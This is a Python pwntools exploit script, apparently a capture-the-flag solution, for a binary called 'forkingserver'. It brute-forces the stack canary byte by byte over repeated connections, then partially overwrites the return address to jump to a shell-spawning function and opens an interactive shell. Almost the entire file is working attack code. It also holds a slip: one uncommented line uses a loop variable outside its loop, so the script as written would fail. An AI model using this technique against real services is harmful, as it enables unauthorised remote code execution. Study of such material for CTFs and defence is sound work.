from pwn import *
# context.terminal = ["tmux", "split", "-h"]
# context.log_level = "debug" # shows payload

def main():
    elf = context.binary = ELF('./forkingserver')

    #     Arch:     amd64-64-little
    #     RELRO:    Partial RELRO
    #     Stack:    Canary found
    #     NX:       NX enabled
    #     PIE:      PIE enabled

    # conn = remote('vuln.redrocket.club',2288)

    ############ EXPLOIT GOES HERE ###############


    # stack: canary found --> brute force stack canary
    payload = b'A' * 72
    test = "jjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjj"

    # for canary_index in range(0,8):
    #     for byte in range(0,255):
    #         bf_conn = remote('localhost', 6666)
    #         byte = byte.to_bytes(1, 'big')
    #         payload_attempt = payload + byte
    #         bf_conn.recvuntil("!")
    #         bf_conn.send(payload_attempt)
    #         bf_conn.recvuntil("bytes")
    #         try:
    #             bf_conn.recvuntil("ted!")
    #             if(canary_index==0):
    #                 canary = byte
    #             if (canary_index > 0):
    #                 canary = canary + byte
    #             print("missing byte is: " + str(byte))
    #             break;
    #         except:
    #             continue
    #     payload = payload + byte
    #
    # print(canary)

    plsgivemeshell = p64(0x101440)

    # locally and remotely, the lowest byte is always the same (here: 40)
    # however, the second lowest byte is not, so we need to brute force this one

    # for byte in range(0,255):
    #     conn = remote('localhost', 6666)  # gdb.debug("./forkingserver", gdbscript="""b *main continue""")
    #     conn.recvuntil("!")
    plsgivemeshell = p8(0x40) + byte.to_bytes(1, "big")
    #     payload = b'A' * 72 + b'\x00!\x18\x8d\xad\t;x' + p64(0x00) + plsgivemeshell
    #     conn.send(payload)
    #     conn.recvuntil("bytes")
    #     conn.sendline("ls")



    conn = remote('localhost', 6666)  # gdb.debug("./forkingserver", gdbscript="""b *main continue""")
    conn.recvuntil("!")
    plsgivemeshell = p8(0x40) + p8(0x14)
    payload = b'A' * 72 + b'\x00!\x18\x8d\xad\t;x' + p64(0x00) + plsgivemeshell
    conn.send(payload)
    conn.recvuntil("bytes")
    conn.sendline("ls")
    conn.interactive()












# b'jjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjj\x00!\x18\x8d\xad\t'


if __name__ == "__main__":
    main()